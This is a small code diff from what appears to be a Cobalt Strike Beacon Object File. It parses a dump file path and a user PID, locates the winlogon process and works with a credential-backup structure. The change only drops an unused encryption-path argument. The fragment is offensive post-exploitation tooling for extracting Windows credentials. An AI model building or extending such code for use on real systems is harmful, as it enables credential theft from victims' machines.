@@ -116,10 +116,8 @@ void go(char *args, int len)
     PCRED_BACKUP backupData;
     CHAR *backupFile = NULL;
     wchar_t *dumpfilepath;
-    wchar_t *encfilepath;
 
     dumpfilepath = (wchar_t *)BeaconDataExtract(&parser, NULL);
-    encfilepath = (wchar_t *)BeaconDataExtract(&parser, NULL);
     userpid = BeaconDataInt(&parser);
 
     DWORD PID = FindWinLogonPid();
